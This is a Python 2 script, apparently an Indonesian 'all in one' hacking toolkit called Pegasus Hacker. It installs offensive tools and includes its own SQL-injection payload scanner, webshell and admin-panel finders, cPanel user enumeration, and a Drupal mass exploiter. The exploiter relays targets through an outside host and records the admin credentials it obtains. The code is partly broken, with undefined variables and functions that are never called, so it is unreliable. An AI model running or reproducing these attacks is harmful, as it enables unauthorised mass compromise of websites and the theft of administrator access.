 #!/usr/bin/env python2.7
#
#          All In One Tool For Penetration Testing 
#           Authors : dr. Muhammad Sobri Maulana, CEH
#
import sys
import os
import time
import httplib
import subprocess
import re, urllib2
import socket
import urllib,sys,json
import telnetlib
import glob
import random
import Queue 
import threading
from getpass import getpass
from commands import *
from sys import argv
from platform import system
from urlparse import urlparse
from xml.dom import minidom
from optparse import OptionParser
from time import sleep
########################## 
#Variables
yes = set(['yes','y', 'ye', 'Y'])
no = set(['no','n'])
def logo():
    print """
                      A Penetration Testing Framework
                              PEGASUS HACKER                                      
                                                                      
  [+]             Coded By Muhammad Sobri Maulana  [+] 
  [+]                www.dohamupretoragean.ga      [+] 
  [+]             Salam hacking untuk semua hacker [+] 
"""
def menu():
    print ("""
                     A Penetration Testing Framework
                              PEGASUS HACKER                                      
                                                                      
  [+]             Coded By Muhammad Sobri Maulana  [+] 
  [+]                www.dohamupretoragean.ga      [+] 
  [+]             Salam hacking untuk semua hacker [+] 
    Pilih Menu:

    1 : Pega Data
    2 : Pega Password
    3 : Pega wifi
    4 : Pega Exploit
    5 : Pega Sadap
    6 : Pega Website
    7 : Pegasus Tools
    99 : Exit

    """)
    choice = raw_input("Pilih:")
    
    if choice == "1":
        info()
    elif choice == "2":
        passwd()
    elif choice == "3":
        wire()
    elif choice == "4":
        exp()
    elif choice == "5":
        snif()
    elif choice == "6":
        webhack()
    elif choice == "7":
        tnn()
    elif choice == "99":
        clearScr(),sys.exit();
    elif choice == "":
        menu()
    else: 
        menu()
def h2ip():
    host = raw_input("Pilih Host : ")
    ips = socket.gethostbyname(host)
    print(ips)
def ports():
    clearScr()
    target = raw_input('Masukkan IP address :')
    os.system("nmap -O -Pn %s" % target) 
    sys.exit();
def ifinurl():
    print""" Pencarian lanjutan ini di mesin pencari, memungkinkan analisis yang tersedia untuk mengeksploitasi GET / POST menangkap email & url, dengan persimpangan validasi internal kustom untuk setiap target / url ditemukan."""
    print('Sudah Install Inurl ? ')
    cinurl = raw_input("Y / N : ")
    if cinurl in yes:
        inurl()
    if cinurl in no:
        menu()
    elif cinurl == "":
        menu()
    else: 
        menu()
def commix():
    print ("Automated All-in-One OS Command Injection dan Alat Eksploitasi.")
    print ("Cara : python commix.py --help")
    choicecmx = raw_input("Lanjut: y/n :")
    if choicecmx in yes:
        os.system("git clone https://github.com/stasinopoulos/commix.git commix")
    elif choicecmx in no:
        os.system('clear'); info()        
def pixiewps():
    print"""Pixiewps adalah alat yang ditulis dalam C digunakan untuk bruteforce offline pin WPS memanfaatkan entropi yang tidak ada rendah atau beberapa Access Points, yang disebut "pixie debu serangan" ditemukan oleh Dominique Bongard di musim panas 2014. Hal ini dimaksudkan untuk tujuan pendidikan hanya
    """
    choicewps = raw_input("Lanjut ? Y/N : ")
    if choicewps in yes :
        os.system("git clone https://github.com/wiire/pixiewps.git") 
        os.system(" cd pixiewps/src & make ")
        os.system(" cd pixiewps/src & sudo make install")
    if choicewps in no : 
        menu() 
    elif choicewps == "":
        menu()
    else: 
        menu()
def webhack():
    print("1 : Hack Drupal ")
    print("2 : Inurlbr")
    print("3 : Wordpress dan Joomla Scanner")
    print("4 : Scan Com_Fabrik")
    print("5 : Cek File Upload")
    print("6 : Scan Wordpress")
    print("7 : Scan plug-in wordpress")
    print("8 : Cari shell dan direktori")
    print("99 : Exit")
    choiceweb = raw_input("Enter Your Choice : ")
    if choiceweb == "1":
        clearScr()
        maine()
    if choiceweb == "2":
        clearScr(); ifinurl()
    if choiceweb =='3':
        clearScr(); wppjmla()
    if choiceweb =="4":
        clearScr(); gravity()
    if choiceweb =="5":
        clearScr(); sqlscan()
    if choiceweb =="6":
        clearScr(); wpminiscanner()
    if choiceweb =="7":
        clearScr();wppluginscan()
    if choiceweb =="8":
        clearScr();shelltarget()
    elif choiceweb =="99":
        menu()
    elif choiceweb == "":
        menu()
    else: 
        menu() 
def inurl():
    dork = raw_input("Pilih Dork:")
    output = raw_input("Pilih dan Simpan :")
    os.system("./inurlbr.php --dork '{0}' -s {1}.txt -q 1,6 -t 1".format(dork, output))
    if cinurl in no:
        insinurl()
    elif cinurl == "":
        menu()
    else: 
        menu()
def insinurl():
    os.system("git clone https://github.com/googleinurl/SCANNER-INURLBR.git")
    os.system("chmod +x SCANNER-INURLBR/inurlbr.php")
    os.system("apt-get install curl libcurl3 libcurl3-dev php5 php5-cli php5-curl")
    os.system("mv /SCANNER-INURLBR/inurbr.php inurlbr.php")
    clearScr()
    inurl()
def nmap():

    choice7 = raw_input("Lanjut ? Y / N : ")
    if choice7 in yes :
        os.system("wget https://nmap.org/dist/nmap-7.01.tar.bz2")
        os.system("bzip2 -cd nmap-7.01.tar.bz2 | tar xvf -")
        os.system("cd nmap-7.01 & ./configure")
        os.system("cd nmap-7.01 & make")
        os.system("su root")
        os.system("cd nmap-7.01 & make install")
    elif choice7 in no :
        info()
    elif choice7 == "":
        menu()
    else: 
        menu()
def jboss():
    os.system('clear')
    print ("PegaBox JBoss")
    print ("Autopwn")
    print ("Pegasus Hacker.")
    print ("")
    print ("Cara : ./e.sh target_ip tcp_port ")
    print("Lanjut: y/n")
    choice9 = raw_input("yes / no :")
    if choice9 in yes:
        os.system("git clone https://github.com/SpiderLabs/jboss-autopwn.git"),sys.exit();
    elif choice9 in no:
        os.system('clear'); exp()
    elif choice9 == "":
        menu()
    else: 
        menu()
def wppluginscan():
    NotDapat = [404,401,400,403,406,301]
    sitesfile = raw_input("sites file : ")
    filepath = raw_input("Plugins File : ")
    def scan(site, dir):
        global resp
        try:
                conn = httplib.HTTPConnection(site)
                conn.request('HEAD', "/wp-content/plugins/" + dir)
                resp = conn.getresponse().status
        except(), message:
                print "Cant Connect :",message
                pass
    def timer():
        now = time.localtime(time.time())
        return time.asctime(now)
    def main():
        sites = open(sitesfile).readlines()
        plugins = open(filepath).readlines()
        for site in sites:
            site = site.rstrip()
        for plugin in plugins:
            plugin = plugin.rstrip()
            scan(site,plugin)
            if resp not in NotDapat:
                    print "+----------------------------------------+"
                    print "| current site :" + site
                    print "| Dapat Plugin : "  + plugin
                    print "| Hasil:",resp
#----------------------------------------------------------------
def sqlmap():
    print ("Cara : python sqlmap.py -h")
    choice8 = raw_input("Lanjut: y/n :")
    if choice8 in yes:
        os.system("git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev & ")
    elif choice8 in no:
        os.system('clear'); info()
    elif choice8 == "":
        menu()
    else: 
        menu()
directories = ['/uploads/','/upload/','/files/','/resume/','/resumes/','/documents/','/docs/','/pictures/','/file/','/Upload/','/Uploads/','/Resume/','/Resume/','/UsersFiles/','/Usersiles/','/usersFiles/','/Users_Files/','/UploadedFiles/','/Uploaded_Files/','/uploadedfiles/','/uploadedFiles/','/hpage/','/admin/upload/','/admin/uploads/','/admin/resume/','/admin/resumes/','/admin/pictures/','/pics/','/photos/','/Alumni_Photos/','/alumni_photos/','/AlumniPhotos/','/users/']
shells = ['wso.php','shell.php','an.php','hacker.php','lol.php','up.php','cp.php','upload.php','sh.php','pk.php','mad.php','x00x.php','worm.php','1337worm.php','config.php','x.php','haha.php']
upload = []
#--------------
def grabuploadedlink(url):
    try :
                    for dir in directories :
                              currentcode = urllib.urlopen(url + dir).getcode()
                              if currentcode == 200 or currentcode ==  403:
                                     print "-------------------------"
                                     print "  [ + ] Dapat Directory :  " + str(url + dir)               + " [ + ]"     
                                     print "-------------------------"                                                                   
                                     upload.append(url + dir)  
    except :
      pass     
def grabshell(url) :                                                                     
   try :
        for upl in upload :
                            for shell in shells :
                              currentcode = urllib.urlopen(upl + shell).getcode()
                              if currentcode == 200 :
                                     print "-------------------------"
                                     print "  [ ! ] Dapat Shell :  " + str(upl + shell)         + " [ ! ]"     
                                     print "-------------------------"         
   except :
        pass  
def shelltarget():
    print("exemple : http://target.com")
    line = raw_input("target : ")
    line = line.rstrip()
    grabuploadedlink(line)
    grabshell(line)

def setoolkit():
    print ("Setoolkit khusus Linux")
    print("Pegasus Hacker ")
    print(" Muhammad Sobri Maulana ")
    print("Dokter Hacker Programmer Muslim Entrepreunership Motviator Translator Magician Sutradara Security Tester")
    print("")
    choiceset = raw_input("y / n :")
    if choiceset in yes:
        os.system("git clone https://github.com/trustedsec/social-engineer-toolkit.git")
        os.system("python social-engineer-toolkit/setup.py")
    if choiceset in no:
        clearScr(); info()
    elif choiceset == "":
        menu()
    else: 
        menu()
def cupp():
    print("Cupp untuk hack akun sosial ")
    print("Cara: python cupp.py -h")
    choicecupp = raw_input("Lanjut: y/n : ")
    
    if choicecupp in yes:
        os.system("git clone https://github.com/Mebus/cupp.git")
        print("Unduh sukses")
    elif choicecupp in no:
        clearScr(); passwd()
    elif choicecupp == "":
        menu()
    else: 
        menu()
def ncrack():
    print("Ncrack untuk crack ssh, ftp dan sebagainya.")
    print("Butuh : nmap >= 0.3ALPHA / rprogram ~> 0.3")
    print("Lanjut: y/n")
    choicencrack = raw_input("y / n :")
    if choicencrack in yes:
        os.system("git clone https://github.com/sophsec/ruby-ncrack.git")
        os.system("cd ruby-ncrack")
        os.system("install ruby-ncrack")
    elif choicencrack in no:
        clearScr(); passwd()
    elif choicencrack == "":
        menu()
    else: 
        menu()
def reaver():
    print """
      Reaver telah dirancang untuk menjadi serangan yang kuat dan praktis terhadap Pengaturan Wi-Fi Protected
       PIN WPS registrar untuk memulihkan WPA / WPA2 passphrase. Telah diuji terhadap
       Berbagai jalur akses dan implementasi WPS
       1 untuk menerima / 0 menurun
        """
    creaver = raw_input("y / n :")
    if creaver in yes:
        os.system("apt-get -y install build-essential libpcap-dev sqlite3 libsqlite3-dev aircrack-ng pixiewps")
        os.system("git clone https://github.com/t6x/reaver-wps-fork-t6x.git")
        os.system("cd reaver-wps-fork-t6x/src/ & ./configure")
        os.system("cd reaver-wps-fork-t6x/src/ & make")
    elif creaver in no:
        clearScr(); wire()
    elif creaver == "":
        menu()
    else: 
        menu()
def ssls():
    print"""sslstrip adalah alat MITM yang mengimplementasikan stripping SSL Moxie Marlinspike ini
     serangan.
     Hal ini membutuhkan Python 2.5 atau yang lebih baru, bersama dengan 'memutar' modul python."""
    cssl = raw_input("y / n :")
    if cssl in yes: 
        os.system("git clone https://github.com/moxie0/sslstrip.git")
        os.system("sudo apt-get install python-twisted-web")
        os.system("python sslstrip/setup.py")
    if cssl in no:
        snif()
    elif cssl =="":
        menu()
    else:
        menu()
def unique(seq):
        seen = set()
        return [seen.add(x) or x for x in seq if x not in seen]
def bing_all_grabber(s):
        
        lista = []
        page = 1
        while page <= 101:
                try:
                        bing = "http://www.bing.com/search?q=ip%3A" + s + "+&count=50&first=" + str(page)
                        openbing = urllib2.urlopen(bing)
                        readbing = openbing.read()
                        findwebs = re.findall('<h2><a href="(.*?)"', readbing)
                        for i in range(len(findwebs)):
                                allnoclean = findwebs[i]
                                findall1 = re.findall('http://(.*?)/', allnoclean)
                                for idx, item in enumerate(findall1):
                                        if 'www' not in item:
                                                findall1[idx] = 'http://www.' + item + '/'
                                        else:
                                                findall1[idx] = 'http://' + item + '/'
                                lista.extend(findall1)
 
                        page += 50
                except urllib2.URLError:
                        pass
 
        final = unique(lista)
        return final
def check_gravityforms(sites) :
        import urllib
        gravityforms = []
        for site in sites :
                try :
                        if urllib.urlopen(site+'wp-content/plugins/gravityforms/gravityforms.php').getcode() == 403 :
                                gravityforms.append(site)
                except :
                        pass
 
        return gravityforms
def gravity():
    ip = raw_input('Enter IP : ')
    sites = bing_all_grabber(str(ip))
    gravityforms = check_gravityforms(sites)
    for ss in gravityforms :
            print ss
     
    print '\n'
    print '[*] Dapat, ', len(gravityforms), ' gravityforms.'
def shellnoob():
    print """Pegashell - mampu membuat shell yang terbaik!"""
    cshell = raw_input("Y / N : ")
    if cshell in yes:
        os.system("git clone https://github.com/reyammer/shellnoob.git")
        os.system("mv shellnoob/shellnoob.py shellnoob.py")
        os.system("sudo python shellnoob.py --install")
    if cshell in no:
        exp()
    elif cshell =="":
        menu()
    else:
        menu()
def info():
    print("1: nmap ")
    print("2: Setoolkit")
    print("3: Port Scanning")
    print("4: Host To IP")
    print("99: Kembali Ke Menu")
    choice2 = raw_input("Pilih Menu:")
    if choice2 == "1":
        os.system('clear'); nmap()
    if choice2 == "2":
        clearScr(); setoolkit()
    if choice2 == "3":
        clearScr(); ports()
    if choice2 == "4":
        clearScr(); h2ip()
    elif choice2 =="99":
        clearScr(); menu()
    elif choice2 == "":
        menu()
    else: 
        menu()
def priv8():
    tnn()
def passwd():
    print("1: Cupp ")
    print("2: Ncrack")
    print("99: Kembali Ke Menu")
    choice3 = raw_input("Pilih Menu:")
    if choice3 =="1":
     clearScr(); cupp()
    elif choice3 =="2":
        clearScr(); ncrack()
    elif choice3 =="99":
        clearScr(); menu()
    elif choice3 == "":
        menu()
    elif choice3 == "3":
        fb()
    else: 
        menu()
def wire():
    print("1 : reaver ")
    print("2 : pixiewps")
    print("99: Kembali ke Menu Utama")
    choice4 = raw_input("Pilih Menu:")
    if choice4 =="1":
     clearScr();reaver()
    if choice4 =="2":
        clearScr(); pixiewps()
    elif choice4 =="99":
        menu()
    elif choice4 == "":
        menu()
    else: 
        menu()
def exp():
    print("1 : jboss-autopwn ")
    print("2 : sqlmap")
    print("3 : Shellnoob")
    print("4 : commix")
    print("99 : Go Kembali Ke Menu")
    choice5 = raw_input("Pilih Menu:")
    if choice5 =="2":
        clearScr(); sqlmap()
    if choice5 =="1":
     os.system('clear'); jboss()
    if choice5 =="3":
        clearScr(); shellnoob()
    if choice5 =="4":
        os.system("clear"); commix()
    elif choice5 =="99":
        menu()
    elif choice5 == "":
        menu()
    else: 
        menu()
def snif():
    print("1 : Setoolkit ")
    print("2 : Ssltrip")
    print("99: Kembali Ke Menu")
    choice6 = raw_input("Pilih Menu:")
    if choice6 =="1":
     clearScr(); setoolkit()
    if choice6 =="2":
        clearScr(); ssls()
    if choice6 =="99":
       clearScr(); menu()
    elif choice6 == "":
        menu()
    else: 
        menu()
def win():
    clearScr()
    print("Our Tool Does Not Support Windows , run it on linux or install a virtual machine ")
    sys.exit();
  #Check use OS
def OS():
    print(
    """
    Choose Operating System : 
    1) Mac OSX
    2) Linux
    3) Windows
    """)
    system = raw_input("choose an OS : ")
    if system =="2":
        menu()
    elif system =="1":
        root()
    elif system =="3":
        win()
    elif system == "":
        OS()
    else:
        sys.exit();
def root():
    if os.getuid() != 0:
        print("Are you root? Please execute as root")
        exit() 
    else:
        menu()
menuu = """
 1) Get all websites
 2) Get joomla websites
 3) Get wordpress websites
 4) Find control panel
 5) Find zip files
 6) Find upload files
 7) Get server users
 8) Scan from SQL injection
 9) Scan ports (range of ports)
 10) Scan ports (common ports)
 11) Get server banner
 12) Bypass Cloudflare
 99) Exit
"""
def unique(seq):
    """
    get unique from list Dapat it on stackoverflow
    """
    seen = set()
    return [seen.add(x) or x for x in seq if x not in seen]
def clearScr() :
    """
    Clear pegasus
    """
    if system() == 'Linux':
        os.system('clear')
    if system() == 'Windows':
        os.system('cls')
class TNscan : #TNscan Function menu 
    def __init__(self, serverip) :
        self.serverip = serverip
        self.getSites(False)
        print menuu
        while True :
            choice = raw_input(' Enter choice -> ')
            if choice == '1' :
                self.getSites(True)
            elif choice == '2' :
                self.getJoomla()
            elif choice == '3' :
                self.getWordpress()
            elif choice == '4' :
                self.findPanels()
            elif choice == '5' :
                self.findZip()
            elif choice == '6' :
                self.findUp()
            elif choice == '7' :
                self.getUsers()
            elif choice == '8' :
                self.grabSqli()
            elif choice == '9' :
                ran = raw_input(' Masukkan range port, (ex : 1-1000) -> ')
                self.portScanner(1, ran)
            elif choice == '10' :
                self.portScanner(2, None)
            elif choice == '11' :
                self.getServerBanner()
            elif choice == '12' :
                self.cloudflareBypasser()
            elif choice == '99' :
                menu()
            con = raw_input(' Lanjut [Y/n] -> ')
            if con[0].upper() == 'N' :
                exit()
            else :
                clearScr()
                print menuu
    def getSites(self, a) :
        """
        Dapatkan semua server dari
		bing. Wkwkwkwkwk
        """
        lista = []
        page = 1
        while page <= 101:
            try:
                bing = "http://www.bing.com/search?q=ip%3A" + self.serverip + "+&count=50&first=" + str(page)
                openbing = urllib2.urlopen(bing)
                readbing = openbing.read()
                findwebs = re.findall('<h2><a href="(.*?)"', readbing)
                for i in range(len(findwebs)):
                    allnoclean = findwebs[i]
                    findall1 = re.findall('http://(.*?)/', allnoclean)
                    for idx, item in enumerate(findall1):
                        if 'www' not in item:
                            findall1[idx] = 'http://www.' + item + '/'
                        else:
                            findall1[idx] = 'http://' + item + '/'
                    lista.extend(findall1)
                    
                page += 50
            except urllib2.URLError:
                pass
        self.sites = unique(lista)
        if a :      
            clearScr()
            print '[*] Dapat ', len(lista), ' Website\n'
            for site in self.sites :
                print site 
    def getWordpress(self) :
        """
        mendapatkan situs wordpress menggunakan dork penyerang
         mungkin melakukan serangan daftar password (saya lakukan alat untuk tujuan itu memeriksa pastebin saya)
         atau memindai kerentanan umum menggunakan wpscan misalnya (saya lakukan alat sederhana
         untuk multi scanning menggunakan wpscan)
        """
        lista = []
        page = 1
        while page <= 101:
            try:
                bing = "http://www.bing.com/search?q=ip%3A" + self.serverip + "+?page_id=&count=50&first=" + str(page)
                openbing = urllib2.urlopen(bing)
                readbing = openbing.read()
                findwebs = re.findall('<h2><a href="(.*?)"', readbing)
                for i in range(len(findwebs)):
                    wpnoclean = findwebs[i]
                    findwp = re.findall('(.*?)\?page_id=', wpnoclean)
                    lista.extend(findwp)
                page += 50
            except:
                pass
        lista = unique(lista)
        clearScr()
        print '[*] Dapat ', len(lista), ' Wordpress Website\n'
        for site in lista :
            print site
    def getJoomla(self) :
        """
        mendapatkan semua situs joomla menggunakan bing mencari penyerang dapat brute kekuatan atau memindai mereka 
        """
        lista = []
        page = 1
        while page <= 101:
            bing = "http://www.bing.com/search?q=ip%3A" + self.serverip + "+index.php?option=com&count=50&first=" + str(page)
            openbing = urllib2.urlopen(bing)
            readbing = openbing.read()
            findwebs = re.findall('<h2><a href="(.*?)"', readbing)
            for i in range(len(findwebs)):
                jmnoclean = findwebs[i]
                findjm = re.findall('(.*?)index.php', jmnoclean)
                lista.extend(findjm)
            page += 50
        lista = unique(lista)
        clearScr()
        print '[*] Dapat ', len(lista), ' Joomla Website\n'
        for site in lista :
            print site
############################
#find admin panels
    def findPanels(self) :
        """
        menemukan panel dari situs meraih penyerang dapat melakukan banyak tes kerentanan di daerah admin
        """
        print "[~] Finding admin panels"
        adminList = ['admin/', 'site/admin', 'admin.php/', 'up/admin/', 'central/admin/', 'whm/admin/', 'whmcs/admin/', 'support/admin/', 'upload/admin/', 'video/admin/', 'shop/admin/', 'shoping/admin/', 'wp-admin/', 'wp/wp-admin/', 'blog/wp-admin/', 'admincp/', 'admincp.php/', 'vb/admincp/', 'forum/admincp/', 'up/admincp/', 'administrator/', 'administrator.php/', 'joomla/administrator/', 'jm/administrator/', 'site/administrator/', 'install/', 'vb/install/', 'dimcp/', 'clientes/', 'admin_cp/', 'login/', 'login.php', 'site/login', 'site/login.php', 'up/login/', 'up/login.php', 'cp.php', 'up/cp', 'cp', 'master', 'adm', 'member', 'control', 'webmaster', 'myadmin', 'admin_cp', 'admin_site']
        clearScr()
        for site in self.sites :
            for admin in adminList :
                try :
                    if urllib.urlopen(site + admin).getcode() == 200 :
                        print " [*] Dapat admin panel -> ", site + admin
                except IOError :
                    pass
 ############################         
 #find ZIP files          
    def findZip(self) :
        """
        menemukan file zip dari situs meraih
         itu mungkin berisi informasi yang berguna
        """
        zipList = ['backup.tar.gz', 'backup/backup.tar.gz', 'backup/backup.zip', 'vb/backup.zip', 'site/backup.zip', 'backup.zip', 'backup.rar', 'backup.sql', 'vb/vb.zip', 'vb.zip', 'vb.sql', 'vb.rar', 'vb1.zip', 'vb2.zip', 'vbb.zip', 'vb3.zip', 'upload.zip', 'up/upload.zip', 'joomla.zip', 'joomla.rar', 'joomla.sql', 'wordpress.zip', 'wp/wordpress.zip', 'blog/wordpress.zip', 'wordpress.rar']
        clearScr()
        print "[~] Finding zip file"
        for site in self.sites :
            for zip1 in zipList :
                try:
                    if urllib.urlopen(site + zip1).getcode() == 200 :
                        print " [*] Dapat zip file -> ", site + zip1
                except IOError :
                    pass
 ############################  
 #find upload directories     
    def findUp(self) :
        """
        menemukan bentuk upload dari meraih
         situs penyerang mungkin berhasil
         upload file berbahaya seperti webshells
        """
        upList = ['up.php', 'up1.php', 'up/up.php', 'site/up.php', 'vb/up.php', 'forum/up.php','blog/up.php', 'upload.php', 'upload1.php', 'upload2.php', 'vb/upload.php', 'forum/upload.php', 'blog/upload.php', 'site/upload.php', 'download.php']
        clearScr()
        print "[~] Finding Upload"
        for site in self.sites :
            for up in upList :
                try :   
                    if (urllib.urlopen(site + up).getcode() == 200) :
                        html = urllib.urlopen(site + up).readlines()
                        for line in html :
                            if re.findall('type=file', line) :
                                print " [*] Dapat upload -> ", site+up
                except IOError :
                    pass
 ############################ 
#find users                  
    def getUsers(self) :
        """
        
		mendapatkan pengguna server menggunakan metode DAPAT oleh
         hacker Iran, penyerang mungkin
         melakukan serangan bruteforce pada CPanel, ssh, ftp atau
         bahkan mysql jika mendukung remote login
         (Anda dapat menggunakan medusa atau hydra)
        """
        clearScr()
        print "[~] Grabbing Users"
        userslist = []
        for site1 in self.sites :
            try:
                site = site1
                site = site.replace('http://www.', '')
                site = site.replace('http://', '')
                site = site.replace('.', '')
                if '-' in site:
                    site = site.replace('-', '')
                site = site.replace('/', '')
                while len(site) > 2:
                    resp = urllib2.urlopen(site1 + '/cgi-sys/guestbook.cgi?user=%s' % site).read()
                    if 'invalid username' not in resp.lower():
                        print '\t [*] Dapat -> ', site
                        userslist.append(site)
                        break
                    else :
                        print site
                        
                    site = site[:-1]
            except:
                pass
                    
        clearScr()
        for user in userslist :
            print user
############################        
#bypass cloudflare   
    def cloudflareBypasser(self) :
        """
        pega-bypass
        """
        clearScr()
        print "[~] Bypassing cloudflare"
        subdoms = ['mail', 'webmail', 'ftp', 'direct', 'cpanel']
        for site in self.sites :
            site.replace('http://', '')
            site.replace('/', '')           
            try:
                ip = socket.gethostbyname(site)
            except socket.error:
                pass
            for sub in subdoms:
                doo = sub + '.' + site
                print ' [~] Trying -> ', doo
                try:
                    ddd = socket.gethostbyname(doo)
                    if ddd != ip:
                        print ' [*] Cloudflare bypassed -> ', ddd
                        break
                except socket.error :
                    pass
############################   
#find the server banner                 
    def getServerBanner(self) :
        """
        Pega-banner
        """
        clearScr()
        try:
            s = 'http://' + self.serverip
            httpresponse = urllib.urlopen(s)
            print ' [*] Server header -> ', httpresponse.headers.getheader('server')
        except:
            pass
############################    
#greb the sqli         
    def grabSqli(self) :
        """
        Cek Sqli
        """
        page = 1
        lista = []
        while page <= 101:
            try:
                bing = "http://www.bing.com/search?q=ip%3A" + self.serverip + "+php?id=&count=50&first=" + str(page)
                openbing = urllib2.urlopen(bing)
                readbing = openbing.read()
                findwebs = re.findall('<h2><a href="(.*?)"', readbing)
                for i in range(len(findwebs)):
                    x = findwebs[i]
                    lista.append(x)
            except:
                pass            
            page += 50  
        lista = unique(lista)       
        self.checkSqli(lista)
 ############################      
 #scan for sql injection  
    def checkSqli(self, s):
        """
        Cek Sqli
        """
        clearScr()
        print "[~] Checking SQL injection"
        payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><", "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"]
        check = re.compile("Incorrect syntax|mysql_fetch|Syntax error|Unclosed.+mark|unterminated.+qoute|SQL.+Server|Microsoft.+Database|Fatal.+error", re.I)
        for url in s:
            try:
                for param in url.split('?')[1].split('&'):
                    for payload in payloads:
                        power = url.replace(param, param + payload.strip())
                        #print power
                        html = urllib2.urlopen(power).readlines()
                        for line in html:
                            checker = re.findall(check, line)
                            if len(checker) != 0 :
                                print ' [*] SQLi Dapat -> ', power
            except:
                pass
############################   
############################        
#scan for ports  
def portScanner(self, mode, ran) :
        """
        Pega port
        """
        clearScr()
        print "[~] Scanning Ports"
        def do_it(ip, port):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            #sock.settimeout(5)
            sock = sock.connect_ex((ip,port))
            if sock == 0:
                print " [*] Port %i is open" % port 
        
        if mode == 1 :
            a = ran.split('-')
            start = int(a[0])
            end = int(a[1])
            for i in range(start, end):
                do_it(self.serverip, i)
        elif mode == 2 :
            for port in [80,21,22,2082,25,53,110,443,143] :
                # didn't use multithreading cos it's few ports
                do_it(self.serverip, port)
############################
minu ='''
\t 1: Exploiter Bing
\t 2: Get Drupal Websites
\t 3: Drupal Mass Exploiter
\t 99: Kembali Ke Menu
'''


            #Definition Of Drupal Bing Expoliter 
def drupal():

    '''Drupal Exploit Binger All Websites Of server '''
    ip  = raw_input('1- IP : ')
    page  = 1
    while page <= 50 :
      
      url   = "http://www.bing.com/search?q=ip%3A"+ip+"&go=Valider&qs=n&form=QBRE&pq=ip%3A"+ip+"&sc=0-0&sp=-1&sk=&cvid=af529d7028ad43a69edc90dbecdeac4f&first="+str(page)
      req   = urllib2.Request(url)
      opreq = urllib2.urlopen(req).read()
      findurl = re.findall('<div class="b_title"><h2><a href="(.*?)" h=',opreq)
      page += 1 
      
      for url in findurl :
        try : 
            
                        urlpa = urlparse(url)
                        site  = urlpa.netloc

                        print "[+] Testing At "+site
                        resp = urllib2.urlopen('http://crig-alda.ro/wp-admin/css/index2.php?url='+site+'&submit=submit')
                        read=resp.read()
                        if "User : HolaKo" in read:
                           print "Exploit Dapat =>"+site

                           print "user:HolaKo\npass:admin"
                           a = open('up.txt','a')
                           a.write(site+'\n')
                           a.write("user:"+user+"\npass:"+pwd+"\n")
                        else :
                           print "[-] Expl Not Dapat :( "

        except Exception as ex :
                       print ex
                       sys.exit(0)


            #Drupal Server ExtraCtor
def getdrupal():
    ip  = raw_input('Enter The Ip : ')
    page  = 1
    sites = list()
    while page <= 50 :
      
      url   = "http://www.bing.com/search?q=ip%3A"+ip+"+node&go=Valider&qs=ds&form=QBRE&first="+str(page)
      req   = urllib2.Request(url)
      opreq = urllib2.urlopen(req).read()
      findurl = re.findall('<div class="b_title"><h2><a href="(.*?)" h=',opreq)
      page += 1 
      
      for url in findurl :
                             split = urlparse(url)
                             site   = split.netloc
                             if site not in sites :
                                      print site 
                                      sites.append(site)
      

            #Drupal Mass List Exploiter 
def drupallist():
    listop = raw_input("Enter The list Txt :")
    fileopen = open(listop,'r')
    content = fileopen.readlines() 
    for i in content :
        url=i.strip()
        try :
            openurl = urllib2.urlopen('http://crig-alda.ro/wp-admin/css/index2.php?url='+url+'&submit=submit')
            readcontent = openurl.read()
            if  "Success" in readcontent :
                print "[+]Success =>"+url
                print "[-]username:HolaKo\n[-]password:admin"
                save = open('drupal.txt','a')
                save.write(url+"\n"+"[-]username:HolaKo\n[-]password:admin\n")
                               
            else : 
                print i + "=> exploit not Dapat " 
        except Exception as ex :
            print ex
def maine():
    
     print minu
     choose = raw_input("choose a number :")
     while True : 
      
      if choose == "1": 
        drupal()
      if choose == "2":
        getdrupal()
      if choose == "3":
        drupallist()
      if choose == "4":
        about()
      if choose == "99":
           
            menu()
      con = raw_input('Lanjut [Y/n] -> ')
      if con[0].upper() == 'N' :
                                    exit()
      if con[0].upper() == 'Y' :
                                    maine()
def unique(seq):
    seen = set()
    return [seen.add(x) or x for x in seq if x not in seen]
def bing_all_grabber(s):
    lista = []
    page = 1
    while page <= 101:
        try:
            bing = "http://www.bing.com/search?q=ip%3A" + s + "+&count=50&first=" + str(page)
            openbing = urllib2.urlopen(bing)
            readbing = openbing.read()
            findwebs = re.findall('<h2><a href="(.*?)"', readbing)
            for i in range(len(findwebs)):
                allnoclean = findwebs[i]
                findall1 = re.findall('http://(.*?)/', allnoclean)
                for idx, item in enumerate(findall1):
                    if 'www' not in item:
                        findall1[idx] = 'http://www.' + item + '/'
                    else:
                        findall1[idx] = 'http://' + item + '/'
                lista.extend(findall1)

            page += 50
        except urllib2.URLError:
            pass

    final = unique(lista)
    return final
def check_wordpress(sites) :
    wp = []
    for site in sites :
        try :
            if urllib2.urlopen(site+'wp-login.php').getcode() == 200 :
                wp.append(site)
        except :
            pass

    return wp
def check_joomla(sites) :
    joomla = []
    for site in sites :
        try :
            if urllib2.urlopen(site+'administrator').getcode() == 200 :
                joomla.append(site)
        except :
            pass

    return joomla
def wppjmla():
    
    ipp = raw_input('Masukkan target IP: ')
    sites = bing_all_grabber(str(ipp))
    wordpress = check_wordpress(sites)
    joomla = check_joomla(sites)
    for ss in wordpress :
        print ss
    print '[+] Dapat ! ', len(wordpress), ' Wordpress Websites'
    print '-'*30+'\n'
    for ss in joomla :
        print ss


    print '[+] Dapat ! ', len(joomla), ' Joomla Websites'

    print '\n'
#initialise the tnscan function 
class tnn():
    def __init__(self):
        clearScr()
        aaa = raw_input("Target IP : ")
        TNscan(aaa)
############################
class bcolors:
    HEADER = ''
    OKBLUE = ''
    OKGREEN = ''
    WARNING = ''
    FAIL = ''
    ENDC = ''
    CYAN = ''
class colors():
    PURPLE = ''
    CYAN = ''
    DARKCYAN = ''
    BLUE = ''
    GREEN = ''
    YELLOW = ''
    RED = ''
    BOLD = ''
    ENDC = ''
def grabsqli(ip):
    try :
        print bcolors.OKBLUE  + "Check_Uplaod... "
        print '\n'

        page = 1
        while page <= 21:
                bing = "http://www.bing.com/search?q=ip%3A"+ip+"+upload&count=50&first="+str(page)
                openbing  = urllib2.urlopen(bing)
                readbing = openbing.read()
                findwebs = re.findall('<h2><a href="(.*?)"' , readbing)
                sites = findwebs
                for i in sites :
                            try :
                                      response = urllib2.urlopen(i).read()                                   
                                      checksqli(i)  
                            except urllib2.HTTPError, e:
                                       str(sites).strip(i)
                                   
                page = page + 10 
